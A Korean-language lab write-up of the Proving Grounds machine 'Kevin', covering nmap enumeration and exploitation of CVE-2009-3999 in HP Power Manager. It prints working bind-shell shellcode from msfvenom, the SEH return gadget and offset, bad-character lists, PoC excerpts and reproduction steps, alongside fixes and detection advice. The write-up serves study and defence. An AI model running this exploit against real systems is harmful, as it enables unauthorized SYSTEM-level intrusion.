---
tags:
  - type/machine
  - platform/pg
  - os/windows
  - status/solved
  - tech/pwn/bof
  - tech/pwn/seh
  - tech/pwn/egghunter
  - tech/payload/msfvenom
  - tech/enum/searchsploit
type: machine
platform: pg
os: windows
ip: 192.168.60.45
ports: [80, 135, 139, 445, 3389, 3573]
services: [http, microsoft-ds, ms-wbt-server, msrpc, netbios-ssn]
cves: [CVE-2009-3999]
status: solved
manual_tags: true
manual_cves: true
manual_services: true
tech_count: 5
---

> [!info] 요약
> 타겟 `192.168.60.45` · Windows 7 Ultimate N **7600**(RTM, SP 미적용 · 호스트명 `KEVIN`) · Fundamental · 플래그 1개
> 진입점: 80/tcp 의 GoAhead WebServer / HP Power Manager 식별 → **CVE-2009-3999** `goform/formExportDataLogs` 의 `fileName` SEH 스택 오버플로우 → 공개 python2 PoC + msfvenom bind shell 셸코드 → 에그헌터가 `Accept:` 헤더의 셸코드를 찾아 실행
> 권한상승: **없음** — 익스플로잇이 처음부터 `nt authority\system` 을 줌
> 시행착오·교훈 → [[_PLAYBOOK]]

**이 노트의 1차 기록 범위** — Kali(`10.44.44.128`)의 `~/PG/Kevin/`·`~/Kevin/` 디렉터리가 **현재 존재하지 않음**(2026-08-26 재확인 — `ls: cannot access '/home/kali/PG/Kevin'`). nmap 로그·PoC 사본·중간 스크립트가 남아 있지 않고, 볼트 `파일보관\` 에 이 박스 스크린샷이 **0장**이며 `~/.zsh_history` 에도 흔적이 없음. 따라서 **이 노트의 터미널 출력은 전부 기존 노트 본문에 보존돼 있던 원문**이고, 그 밖의 명령은 재현하지 않았으므로 적지 않았음. 익스플로잇 코드·CVE 정보·Metasploit 모듈 원문은 공개 저장소와 벤더 게시판에서 확인한 것이며 출처는 `## 관련` 에 명시함.

## Target #1 – 192.168.60.45

### Initial Access – GoAhead 임베드 HP Power Manager 의 `formExportDataLogs` SEH 스택 오버플로우로 무인증 SYSTEM 획득

**Vulnerability Explanation:** HP Power Manager 4.2.10 미만의 `goform/formExportDataLogs` 핸들러가 `fileName` 파라미터를 길이 검사 없이 처리해 스택이 넘침(CVE-2009-3999).
- 취약점 부류 = **SEH 기반 스택 버퍼 오버플로우.** 리턴 주소가 아니라 예외 핸들러 체인(nSEH+SEH)이 덮이고, `POP/POP/RET` 가젯으로 실행이 되돌아옴
- 오버플로우 지점은 `fileName` 을 끼워 넣은 **에러 메시지 포맷 과정**임 — Metasploit 모듈이 *"a stack-based buffer overflow occurs due to a long error message (which contains the fileName)"* 로 기술
- 웹 서버가 GoAhead 임베드형이라 핸들러가 **서버 프로세스(`DevManBE.exe`) 내부의 C 함수**로 돎 → 오버플로우 하나가 그 프로세스 권한의 코드 실행이 되고, 그 프로세스가 SYSTEM 서비스임
- CVSSv2 **10.0** `(AV:N/AC:L/Au:N/C:C/I:C/A:C)` — `Au:N` 이라 **인증 불필요**

**Vulnerability Fix:**
- **HP Power Manager 4.2.10 이상으로 업그레이드** — 벤더 게시판 HPSBMA02485 / SSRT090252(2010-01-19)가 수정본을 냄. 16년 묵은 pre-auth RCE 가 남아 있는 것이 근본 원인임
- 단종되어 패치가 없으면 격리하거나 제거할 것. UPS 관리 콘솔은 관리 VLAN 안에서만 접근 가능해야 함
- 관리 웹 UI 를 무인증으로 노출하지 말 것 — 리버스 프록시 앞단의 HTTP Basic 인증 + IP 제한만으로도 pre-auth 익스플로잇이 닿지 못함
- **`DevManBE.exe` 를 전용 저권한 계정으로 구동할 것** — 오버플로우가 성공해도 SYSTEM 이 아니라 그 계정 권한에 그침
- 재빌드가 가능하면 `/DYNAMICBASE /NXCOMPAT /GS /SAFESEH`, 불가능하면 EMET·Exploit Guard 로 프로세스 단위 강제 ASLR·SEHOP — 하드코딩 리턴 주소와 SEH 덮어쓰기가 함께 무력화됨
- 탐지: GoAhead 접근 로그에서 비정상적으로 긴 `fileName` 파라미터를 경보(예: 200자 초과). WAF 가 있으면 `/goform/formExportDataLogs` 에 길이 제한 규칙
- 호스트 전반: Windows 7 빌드 7600 에 SP1 + 누적 업데이트 적용(근본적으로는 지원 종료 OS 를 운영에서 제거) · SMB 서명 필수화(`RequireSecuritySignature=1`) · 3389 는 NLA 강제 + 게이트웨이 경유로만

**Severity:** Critical — 무인증 원격 RCE, 익스플로잇 성공 즉시 `nt authority\system`

**Steps to reproduce the attack:**
1. `nmap -sV -sC -p-` 로 80/tcp 의 `GoAhead-Webs` 헤더와 `http-title: HP Power Manager` 확보
2. 제품명으로 CVE-2009-3999 와 공개 PoC(python2, bind shell) 확보
3. `msfvenom -p windows/shell_bind_tcp LPORT=1234 EXITFUNC=thread -b <badchar> -f python` 으로 셸코드 생성
4. PoC 의 `buf = egg` 를 유지한 채 셸코드만 이어붙임 — egg `b33fb33f` 보존
5. `python2 hpm_exploit.py 192.168.60.45` 실행 → `POST /goform/formExportDataLogs` 전송
6. 30초 대기 후 스크립트가 `nc -nv 192.168.60.45 1234` 로 접속
7. `type C:\Users\Administrator\Desktop\proof.txt`

### Service Enumeration

**Port Scan Results**

| IP Address | Ports Open |
|---|---|
| 192.168.60.45 | TCP: 80, 135, 139, 445, 3389, 3573 (+ 49152–49156 · 49160 동적 RPC) |

```bash
┌──(kali㉿kali)-[~/Kevin]
└─$ sudo nmap -sV -sC -p- -O 192.168.60.45
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-30 01:37 +0000
Nmap scan report for 192.168.60.45
Host is up (0.00033s latency).
Not shown: 65523 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          GoAhead WebServer
|_http-server-header: GoAhead-Webs
| http-title: HP Power Manager
|_Requested resource was http://192.168.60.45/index.asp
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows 7 Ultimate N 7600 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server Microsoft Terminal Service
| ssl-cert: Subject: commonName=kevin
| Not valid before: 2026-06-29T01:09:02
|_Not valid after:  2026-12-29T01:09:02
| rdp-ntlm-info:
|   Target_Name: KEVIN
|   NetBIOS_Domain_Name: KEVIN
|   NetBIOS_Computer_Name: KEVIN
|   DNS_Domain_Name: kevin
|   DNS_Computer_Name: kevin
|   Product_Version: 6.1.7600
|_  System_Time: 2026-06-30T01:39:01+00:00
|_ssl-date: 2026-06-30T01:39:09+00:00; 0s from scanner time.
3573/tcp  open  tag-ups-1?
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49156/tcp open  msrpc         Microsoft Windows RPC
49160/tcp open  msrpc         Microsoft Windows RPC
Device type: general purpose
Running: Microsoft Windows 2008|7|Vista
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1
OS details: Microsoft Windows 7 or Windows Server 2008 R2, Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7, Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008
Network Distance: 2 hops
Service Info: Host: KEVIN; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-06-30T01:39:01
|_  start_date: 2026-06-30T01:09:56
| smb-os-discovery:
|   OS: Windows 7 Ultimate N 7600 (Windows 7 Ultimate N 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::-
|   Computer name: kevin
|   NetBIOS computer name: KEVIN\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-06-29T18:39:01-07:00
|_nbstat: NetBIOS name: KEVIN, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:86:95:5a (VMware)
| smb2-security-mode:
|   2.1:
|_    Message signing enabled but not required
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h23m59s, deviation: 3h07m49s, median: 0s

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 111.97 seconds
```

**플래그 해설**

| 플래그 | 역할 | 빼면 어떻게 되는가 |
|---|---|---|
| `-p-` | 65535 포트 전수 | **`-p-` 로만 추가되는 것은 3573 하나임.** 49152~49156·49160 은 `nmap-services` 빈도가 0.0079~0.00038 로 top-1000 커트라인(0.000152)보다 높아 기본 스캔에도 잡힘. 3573 은 빈도 `0.000000` 이라 전수 스캔에서만 나오고, 「이 제품이 정말 돌고 있다」는 교차 근거였음 |
| `-sV` | 버전 탐지 | `GoAhead WebServer` VERSION 열과 `http-server-header`(version 카테고리 스크립트)가 여기서만 나옴. 다만 **제품명을 준 `http-title` 은 `-sC` 만으로도 나오므로** 이 박스의 결정적 단서가 `-sV` 에 걸려 있던 것은 아님 |
| `-sC` | 기본 NSE 스크립트 | `http-title: HP Power Manager` 와 `smb-os-discovery` 가 여기서 나옴. 제품명을 준 것이 `http-title` 임 |
| `-O` | OS 판정 | `-A` 보다 좁음(traceroute·`--script=default` 없음). 여기서는 `-sC` 가 이미 있어 실질 차이는 traceroute 뿐 |
| 없음: `--min-rate` | — | 111.97초 소요. [[Twiggy]] 는 `--min-rate 5000` 으로 같은 전수 스캔을 53초에 끝냈음. 시험이라면 2배 차이가 누적됨 |
| 없음: `-Pn` | — | 이 박스는 ping 에 응답해 문제가 없었음. 응답 안 하는 박스에서는 스캔이 통째로 중단되므로 PG 에서는 습관적으로 붙이는 편이 나음 |

`Not shown: 65523 closed tcp ports (reset)` — **방화벽 없음.** `closed`(RST 회신)이지 `filtered`(무응답)가 아니므로 **호스트 방화벽이 꺼져 있거나 통과 정책**이라는 뜻임. 부수적으로 스캔도 빠름 — RST 가 즉시 오므로 타임아웃을 기다리지 않음(111.97초에 65535 포트 전수 완료).

그래서 **bind 셸이 성립**했고 실제로 그 경로로 붙었음(타겟이 1234 를 열고 Kali 가 접속). 반대 사례는 [[Twiggy]] — 전 포트가 `filtered` 였고 리버스셸이 실패했음. bind/reverse 판정 절차는 [[_PLAYBOOK#A-31. 리버스셸이 안 붙는다]].

**OS·서비스 판정 — 독립 근거 2개**

| 항목 | 근거 ① | 근거 ② | 확정 |
|---|---|---|---|
| OS | `smb-os-discovery`: `Windows 7 Ultimate N 7600` | `rdp-ntlm-info`: `Product_Version: 6.1.7600` | Windows 7 RTM (빌드 7600) |
| 서비스팩 | 빌드 7600 = RTM. SP1 은 7601 | `OS CPE: cpe:/o:microsoft:windows_7::-` (`::-` = SP 없음) | SP 미적용 |
| 호스트명 | `commonName=kevin` (RDP 인증서) | `NetBIOS computer name: KEVIN` | `KEVIN` |
| 도메인 | `Workgroup: WORKGROUP` | `NetBIOS_Domain_Name: KEVIN` (= 자기 자신) | 도메인 미가입 단독 호스트 |
| 웹 앱 | `http-server-header: GoAhead-Webs` | `http-title: HP Power Manager` | HP Power Manager (GoAhead 임베드) |

`-O` 의 `OS details` 는 `Windows 7 or Windows Server 2008 R2 … Vista SP0 or SP1 … Windows 7 SP1` 을 전부 나열해 **범위가 너무 넓어 쓸 수 없음.** 반면 `smb-os-discovery`·`rdp-ntlm-info` 는 호스트가 스스로 말한 정확한 빌드 번호를 줌 — Windows 박스에서는 이 둘이 항상 우선임. 누적 규율 「버전 판정은 독립 근거 2개」의 Windows 판임([[Hub]] · [[Levram]] · [[RubyDome]] · [[Squid]] · [[Twiggy]]).

**빌드 7600(SP 미적용)이 뜻하는 것** — 2009년 RTM 그대로임. 2010년 이후 패치가 하나도 없다는 뜻이고, 설치된 서드파티 앱도 같은 시기에 멈춰 있을 가능성이 매우 높음. 실제로 HP Power Manager 가 2009년 CVE 에 취약했음.

**포트 3573 — 미확인 서비스가 교차 근거를 줌**

```text
3573/tcp  open  tag-ups-1?
```

물음표는 nmap 이 배너로 확인하지 못했다는 표시임 — 포트 번호로 등록 목록을 조회한 것뿐임. 실제 등록 라벨은 Kali 의 `nmap-services` 에 있음:

```text
tag-ups-1	3573/tcp	0.000000	# Advantage Group UPS Suite
```
— 출처: Kali `/usr/share/nmap/nmap-services` (2026-08-26 직접 조회)

`ups` = 무정전 전원장치이고 **HP Power Manager 는 UPS 관리 소프트웨어**라 80번의 `http-title` 과 방향이 일치함. `[가정]` 다만 이 라벨은 **다른 벤더 제품(Advantage Group)의 이름**이고 배너로 확인한 적이 없으므로 제품 확정 근거로는 쓸 수 없음. 3573 이 HP PM 의 에이전트·관리 포트인지는 **관측 없음** — 확정할 필요도 없었고 **공격면은 80번 웹 인터페이스**였음.

개방빈도가 `0.000000` 이라 top-1000 커트라인(`0.000152`) 밖임 — **`-p-` 없이는 이 포트를 못 봄.** 미확인 포트를 읽는 절차는 [[_PLAYBOOK#C-1. 정찰 직후]].

**확인 후 접은 벡터**

| 포트 | 왜 접었는가 |
|---|---|
| 445 SMB | `account_used: guest` 는 nmap 이 guest 로 붙었다는 뜻이지 익명 공유가 있다는 뜻이 아님. `message_signing: disabled` 는 릴레이 공격 조건이나 **단독 워크그룹 호스트라 릴레이할 상대가 없음.** Win7 7600 은 MS17-010(EternalBlue) 후보이긴 하나 80번이 제품명까지 특정된 더 명확한 경로였음. **관측 없음** — SMB 벡터는 시도하지 않았음 |
| 3389 RDP | 자격증명 없음. 무차별 대입은 계정 잠금 위험 + 시간 낭비 |
| 135 / 49152~ | 익명 RPC 열거(`rpcclient -U ""`)는 시도할 가치가 있으나, 80번이 훨씬 명확한 단서를 이미 줬음 |

**판단 기준: 제품명 + 버전이 특정된 서비스가 있으면 그것을 먼저 판다.** `HP Power Manager` 는 검색어가 완전히 특정되는 이름이고 2009년 제품이라 공개 익스플로잇이 있을 확률이 높았음.

### Initial Access – CVE-2009-3999 SEH 오버플로우

**CVE 번호 확정 — 이 박스를 다루는 자료 상당수가 다른 번호를 인용함.** NVD 원문 대조 결과:

- **CVE-2009-3999** = `goform/formExportDataLogs` 의 `fileName` 스택 오버플로우 → **이 박스가 이것임.** Metasploit `exploit/windows/http/hp_power_manager_filename`
- CVE-2009-2685 = 로그인 폼의 `Login` 변수 스택 오버플로우 → `exploit/windows/http/hp_power_manager_login`(ZDI-09-081). **무관**
- CVE-2009-4000 = 같은 `formExportDataLogs` 의 같은 `fileName` 파라미터를 쓰는 **디렉터리 트래버설.** 파라미터 이름이 같아 헷갈리기 쉬움. **무관**

⚠️ 그래서 frontmatter 에 `manual_cves: true` 를 선언했음 — `extract.py` 가 본문에서 `CVE-\d{4}-\d{4,7}` 를 긁으므로 「이 박스가 아니다」라고 설명하려 적은 번호까지 색인에 올라감.

**NVD 원문:**

> Stack-based buffer overflow in goform/formExportDataLogs in HP Power Manager before 4.2.10 allows remote attackers to execute arbitrary code via a long fileName parameter.

CVSSv2 **10.0** `(AV:N/AC:L/Au:N/C:C/I:C/A:C)` — 최고점임. 벡터를 읽으면 공격 조건이 전부 나옴:

| 벡터 | 값 | 의미 |
|---|---|---|
| `AV:N` | Network | 원격 |
| `AC:L` | Low | 특별한 조건 불필요 |
| `Au:N` | None | **인증 불필요(pre-auth)** ← 가장 중요 |
| `C:C / I:C / A:C` | Complete | 기밀성·무결성·가용성 완전 장악 |

**HP 벤더 게시판 원문**(HPSBMA02485 / SSRT090252, 2010-01-19):

```text
Potential Security Impact: Remote execution of arbitrary code
References: CVE-2009-3999, CVE-2009-4000

SUPPORTED SOFTWARE VERSIONS*: ONLY impacted versions are listed.
HP Power Manager earlier than v4.2.10

CVSS 2.0 Base Metrics
===========================================================
  Reference              Base Vector             Base Score
CVE-2009-3999    (AV:N/AC:L/Au:N/C:C/I:C/A:C)       10.0
CVE-2009-4000    (AV:N/AC:L/Au:N/C:C/I:C/A:C)       10.0
===========================================================

RESOLUTION
HP has made the following available to resolve the vulnerabilities.
HP Power Manager 4.2.10 or subsequent
```

**영향 범위는 4.2.10 미만 전부, 수정 버전은 4.2.10.** 발견자는 Secunia Research 의 Alin Rad Pop 이고, Secunia 어드바이저리(SA-2009-47)가 원인을 한 줄로 말함:

> The vulnerability is caused due to a boundary error when processing parameters sent to the /goform/formExportDataLogs URL. This can be exploited to cause a stack-based buffer overflow via an overly long "fileName" parameter.

**데이터 흐름** — 취약 컴포넌트는 `DevManBE.exe`(HP Power Manager 의 웹 서버 프로세스 본체, GoAhead 임베드). Metasploit 모듈이 리턴 가젯의 출처를 명시적으로 이 파일로 지목함. 즉 `fileName` 을 스택 버퍼에 직접 복사하는 것이 아니라, **`fileName` 을 끼워 넣은 에러 메시지를 포맷하는 과정에서 고정 크기 스택 버퍼가 넘침.**

```text
POST /goform/formExportDataLogs
  fileName = "AAAA...(751바이트 이상)"
  actionType = "1;"          ← 비정상 값 → 에러 경로 유발 [가정]
        │
        ▼
  handler_formExportDataLogs()   (DevManBE.exe 내부)
        │
        ├─ actionType 검증 실패 → 에러 처리 분기
        │
        ▼
  char errbuf[N];                            ← 고정 크기 스택 버퍼
  sprintf(errbuf, "...%s...", fileName);     ← 길이 검사 없음  ★ 여기서 넘침
        │
        ▼
  ┌──────────── 스택 ────────────┐
  │ errbuf[N]                    │  ← A로 채워짐
  │ ...                          │
  │ nSEH   (다음 핸들러 포인터)  │  ← EB C2 90 90 으로 덮임
  │ SEH    (핸들러 함수 포인터)  │  ← 0x004174d5 로 덮임
  └──────────────────────────────┘
```

`[가정]` 표시가 붙은 부분:

- 함수명·실제 `sprintf` 호출 위치·버퍼 크기 `N` 은 확인하지 못했음. 디스어셈블 수준의 1차 분석 자료를 찾지 못했고, 위 의사코드는 Metasploit 모듈 설명(「긴 에러 메시지가 fileName 을 포함해 넘친다」)을 코드 형태로 옮긴 것임
- `actionType=1;` 이 에러 경로를 유발한다는 인과도 추론임. PoC 와 MSF 모듈이 둘 다 이 비정상 값을 고정으로 보낸다는 사실이 근거임

**확정된 것은 「`fileName` 이 길면 스택이 넘치고 SEH 가 덮인다」까지임.** 그 이상은 표시를 달았음.

**SEH 기반임을 판별한 근거 셋** — 전부 일치함:

1. Metasploit 모듈 주석 `# SEH (strip the null byte, HP PM will pad it for us)`
2. 리턴 가젯이 `pop esi # pop ebx # ret 10` — 전형적 POP/POP/RET
3. 그 바로 앞 4바이트가 `\xeb\xc2\x90\x90` — nSEH 에 놓는 short jump

```ruby
'Targets' => [
  [
    # Tested on HP Power Manager 4.2 (Build 7 and 9)
    'Windows XP SP3 / Win Server 2003 SP0',
    {
      'Ret' => 0x004174d5, # pop esi # pop ebx # ret 10 (DevManBE.exe)
      'Offset' => 721
    }
  ]
],
```

**타겟 문자열은 `Windows XP SP3 / Win Server 2003 SP0` 인데 이 박스는 Windows 7 7600 임. 그런데 동작했음** — 주석이 이유를 알려줌. 가젯이 OS DLL 이 아니라 **애플리케이션 자기 자신(`DevManBE.exe`)**에서 왔기 때문임. 주소 `0x004174d5` 는 `0x00400000` 대 = PE 실행 파일의 기본 이미지 베이스임. `[가정 — /DYNAMICBASE 미적용을 직접 확인하지 못했음]` 2009년 제품이라 ASLR 미적용이 자연스럽고, Windows 7 에서 실제로 동작한 것이 경험적 증거임.

**PoC 확보**

```bash
┌──(kali㉿kali)-[~/Kevin]
└─$ git clone https://github.com/Muhammd/HP-Power-Manager.git
Cloning into 'HP-Power-Manager'...
remote: Enumerating objects: 6, done.
remote: Total 6 (delta 0), reused 0 (delta 0), pack-reused 6 (from 1)
Receiving objects: 100% (6/6), done.
```

`git clone` 전에 `searchsploit hp power manager` 를 먼저 칠 것 — **Exploit-DB 전체 사본이 로컬(`/usr/share/exploitdb/`)에 있어** 인터넷이 느리거나 막힌 환경에서도 동작함(`-m` 복사 · `-x` 내용 보기). 다만 GitHub 에만 있는 변형(여기서 쓴 python2 PoC, py3 포크)은 안 나오므로 **둘 다 확인하는 것이 맞음**([[_PLAYBOOK#A-1-11. searchsploit 결과 읽는 법 — 0건도, 히트도 근거가 아니다]]).

**셸코드 생성**

```bash
┌──(kali㉿kali)-[~/Kevin]
└─$ msfvenom -p windows/shell_bind_tcp LHOST=192.168.49.60 LPORT=1234  EXITFUNC=thread -b '\x00\x1a\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5' x86/alpha_mixed --platform windows -f python
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
Attempting to encode payload with 1 iterations of x86/call4_dword_xor
x86/call4_dword_xor succeeded with size 352 (iteration=0)
x86/call4_dword_xor chosen with final size 352
Payload size: 352 bytes
Final size of python file: 1749 bytes
buf =  b""
buf += b"\x31\xc9\x83\xe9\xae\xe8\xff\xff\xff\xff\xc0\x5e"
buf += b"\x81\x76\x0e\x88\x9f\x85\x9f\x83\xee\xfc\xe2\xf4"
buf += b"\x74\x77\x07\x9f\x88\x9f\xe5\x16\x6d\xae\x45\xfb"
buf += b"\x03\xcf\xb5\x14\xda\x93\x0e\xcd\x9c\x14\xf7\xb7"
buf += b"\x87\x28\xcf\xb9\xb9\x60\x29\xa3\xe9\xe3\x87\xb3"
buf += b"\xa8\x5e\x4a\x92\x89\x58\x67\x6d\xda\xc8\x0e\xcd"
buf += b"\x98\x14\xcf\xa3\x03\xd3\x94\xe7\x6b\xd7\x84\x4e"
buf += b"\xd9\x14\xdc\xbf\x89\x4c\x0e\xd6\x90\x7c\xbf\xd6"
buf += b"\x03\xab\x0e\x9e\x5e\xae\x7a\x33\x49\x50\x88\x9e"
buf += b"\x4f\xa7\x65\xea\x7e\x9c\xf8\x67\xb3\xe2\xa1\xea"
buf += b"\x6c\xc7\x0e\xc7\xac\x9e\x56\xf9\x03\x93\xce\x14"
buf += b"\xd0\x83\x84\x4c\x03\x9b\x0e\x9e\x58\x16\xc1\xbb"
buf += b"\xac\xc4\xde\xfe\xd1\xc5\xd4\x60\x68\xc0\xda\xc5"
buf += b"\x03\x8d\x6e\x12\xd5\xf7\xb6\xad\x88\x9f\xed\xe8"
buf += b"\xfb\xad\xda\xcb\xe0\xd3\xf2\xb9\x8f\x60\x50\x27"
buf += b"\x18\x9e\x85\x9f\xa1\x5b\xd1\xcf\xe0\xb6\x05\xf4"
buf += b"\x88\x60\x50\xf5\x80\xc6\xd5\x7d\x75\xdf\xd5\xdf"
buf += b"\xd8\xf7\x6f\x90\x57\x7f\x7a\x4a\x1f\xf7\x87\x9f"
buf += b"\x8c\x4d\x0c\x79\xe2\x8f\xd3\xc8\xe0\x5d\x5e\xa8"
buf += b"\xef\x60\x50\xc8\xe0\x28\x6c\xa7\x77\x60\x50\xc8"
buf += b"\xe0\xeb\x69\xa4\x69\x60\x50\xc8\x1f\xf7\xf0\xf1"
buf += b"\xc5\xfe\x7a\x4a\xe0\xfc\xe8\xfb\x88\x16\x66\xc8"
buf += b"\xdf\xc8\xb4\x69\xe2\x8d\xdc\xc9\x6a\x62\xe3\x58"
buf += b"\xcc\xbb\xb9\x9e\x89\x12\xc1\xbb\x98\x59\x85\xdb"
buf += b"\xdc\xcf\xd3\xc9\xde\xd9\xd3\xd1\xde\xc9\xd6\xc9"
buf += b"\xe0\xe6\x49\xa0\x0e\x60\x50\x16\x68\xd1\xd3\xd9"
buf += b"\x77\xaf\xed\x97\x0f\x82\xe5\x60\x5d\x24\x65\x82"
buf += b"\xa2\x95\xed\x39\x1d\x22\x18\x60\x5d\xa3\x83\xe3"
buf += b"\x82\x1f\x7e\x7f\xfd\x9a\x3e\xd8\x9b\xed\xea\xf5"
buf += b"\x88\xcc\x7a\x4a"
```

| 플래그 | 역할 | 빼면 어떻게 되는가 |
|---|---|---|
| `-p windows/shell_bind_tcp` | 바인드 셸 — 타겟이 포트를 열고 Kali 가 접속 | reverse 였다면 Kali 에 리스너가 필요함. 여기서는 타겟 방화벽이 없어 bind 가 성립했음 |
| `LPORT=1234` | 타겟이 listen 할 포트 | bind 페이로드에서 `LPORT` 는 「타겟이 열 포트」임. reverse 에서의 의미(내 리스너 포트)와 **방향이 반대**임 |
| `LHOST=192.168.49.60` | bind 페이로드에서는 **무의미** | msfvenom 이 datastore 에 넣기만 하고 페이로드가 참조하지 않음. 에러도 경고도 없음 |
| `EXITFUNC=thread` | 셸 종료 시 스레드만 종료 | `process` 면 `DevManBE.exe` 가 죽어 서비스가 내려가고 **재익스플로잇이 불가능해짐.** `seh` 는 예외 경로로 복귀. 프로세스를 살려둬야 하면 `thread` 가 정답 |
| `-b '...'` | badchar 지정 | 지정 안 하면 셸코드에 `\x00`·`\x0a` 가 들어가 헤더가 잘려 **조용히** 실패함 |
| `--platform windows` | 플랫폼 명시 | 페이로드 이름으로 추론되므로 생략 가능. 명시가 안전함 |
| `-f python` | Python 소스 형식으로 출력 | `-f c`·`-f raw`·`-f ps1` 등. PoC 언어에 맞춰야 함 |
| 없음: `-e` | 인코더 미지정 → 자동 선택 | `x86/alpha_mixed` 가 **인코더로 지정되지 않았음.** 출력이 그 증거임 |
| 없음: `-v` | 변수명 미지정 → 기본 `buf` | PoC 의 `buf` 변수와 이름이 충돌함 |

**출력을 읽는 법 — 여기에 이미 오류가 드러나 있음:**

| 출력 줄 | 무슨 뜻인가 |
|---|---|
| `[-] No arch selected, selecting arch: x86` | 아키텍처 자동 판정. 페이로드가 `windows/`(x86)이므로 맞음 |
| `Found 11 compatible encoders` | 인코더가 지정되지 않아 후보를 찾는 중. `-e` 를 줬다면 이 줄이 안 나옴 ★ |
| `Attempting to encode payload with 1 iterations of x86/shikata_ga_nai` | 랭크 순 자동 시도. shikata_ga_nai 가 rank Excellent 라 1순위 |
| `x86/shikata_ga_nai failed with A valid opcode permutation could not be found` | badchar 가 많아 shikata 의 다형성 엔진이 유효한 명령 조합을 못 찾음 |
| `x86/call4_dword_xor chosen with final size 352` | 최종 인코더는 `call4_dword_xor` 임. `alpha_mixed` 가 아님 ★ |

**이 명령에는 결함이 셋 있었고 전부 PoC 주석을 그대로 복사한 결과임** — ① `-e` 누락 ② `shell_bind_tcp` 에 무의미한 `LHOST` ③ `-b` 목록 끝의 `\x5`(= `\x5c` 의 오타. 한 자리 hex 는 `Rex::Text.dehex` 정규식에 매치되지 않아 리터럴 `\`·`x`·`5` 로 남음). 결과적으로 통했으나 **재현성이 없음.** 실제로 금지된 바이트와 금지했어야 할 바이트의 차이(직접 계산):

```text
이 명령의 실제 결과 : 00 0a 0b 0d 1a 20 23 25 26 2b 2f 35 3a 3f 5c 78
Metasploit 모듈 정본: 00 0a 0b 0d 1a 20 23 24 25 26 2b 2c 2d 2e 2f 3a 3b 3d 3f 5c

모듈엔 있는데 빠뜨린 것 : 24($)  2c(,)  2d(-)  2e(.)  3b(;)  3d(=)
명령에만 있는 엉뚱한 것 : 35('5')  78('x')
```

**`,`(0x2c)와 `;`(0x3b)를 빠뜨린 것이 실질적 위험임.** 둘 다 `Accept:` 헤더의 MIME 구분자라 셸코드에 들어가면 헤더 파싱이 깨짐. 위 `buf` 352바이트를 전수 대조한 결과 `,`(0x2c)·`;`(0x3b)는 **0개**였고, 모듈 정본 목록 중 실제로 섞인 것은 `$`(0x24) **1개**뿐임. `$` 는 HTTP 토큰 문자(RFC 7230 `tchar`)라 `Accept:` 파싱을 깨지 않아 결과적으로 통했음 — **목록이 맞아서가 아니라 운이었음.** 검증·예방 절차는 [[_PLAYBOOK]] · [[_PLAYBOOK#A-14. 공개 PoC는 실행 전에 소스를 읽는다]].

**badchar 정본은 Metasploit 모듈임:**

```ruby
'Payload' => {
  'BadChars' => "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c&=+?:;-,/#.\\$%\x1a",
  'DisableNops' => true,
  'EncoderOptions' => { 'BufferRegister' => 'EDI' } # Egghunter jmp edi
},
```

중복을 제거하면 20바이트임:

```text
00 0a 0b 0d 1a 20 23 24 25 26 2b 2c 2d 2e 2f 3a 3b 3d 3f 5c
            SP  #  $  %  &  +  ,  -  .  /  :  ;  =  ?  \
```

이 박스의 정본 명령은 이것임:

```text
-b '\x00\x0a\x0b\x0d\x1a\x20\x23\x24\x25\x26\x2b\x2c\x2d\x2e\x2f\x3a\x3b\x3d\x3f\x5c'
```

`fileName` 은 `urllib.quote_plus()` 로 인코딩해 보내므로 원칙적으로 임의 바이트를 실을 수 있음(널만 예외). **진짜 제약은 셸코드가 인코딩 없이 실리는 `Accept:` 헤더**임 — 목록의 근거는 URL 인코딩이 아니라 그 헤더의 파서임.

**셸코드를 PoC 에 이식** — PoC 의 해당 부분(공개 저장소 원문):

```python
#msfvenom -p windows/shell_bind_tcp LHOST=10.11.0.55 LPORT=1234  EXITFUNC=thread -b '\x00\x1a\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5' x86/alpha_mixed --platform windows -f python

egg="b33fb33f"
buf= egg
buf += "\x31\xc9\x83\xe9\xae\xe8\xff\xff\xff\xff\xc0\x5e\x81"
...
```

PoC 배너의 `## TODO: adjust` 가 가리키는 것 — 실제로 고쳐야 하는 곳:

| # | 고칠 것 | 왜 |
|---|---|---|
| 1 | `buf` 의 셸코드 전체 | 저장소 것은 저자의 LPORT 1234 bind shell. 자기 것으로 교체 |
| 2 | `os.system("nc -nv " + HOST + " 1234")` 의 포트 | 셸코드의 `LPORT` 와 반드시 일치해야 함. **두 군데를 따로 고치는 구조라 놓치기 쉬움** |
| 3 | `PORT = 80` | 타겟 웹 포트. 이 박스는 80 이라 그대로 |
| 4 | `time.sleep(30)` | 에그헌터 스캔 시간. 저자가 파일 끝에 「안 되면 60으로」 주석을 남겼음 |
| 5 | Kali 에 `nc` 설치 필요 | 스크립트가 `os.system` 으로 호출함 |

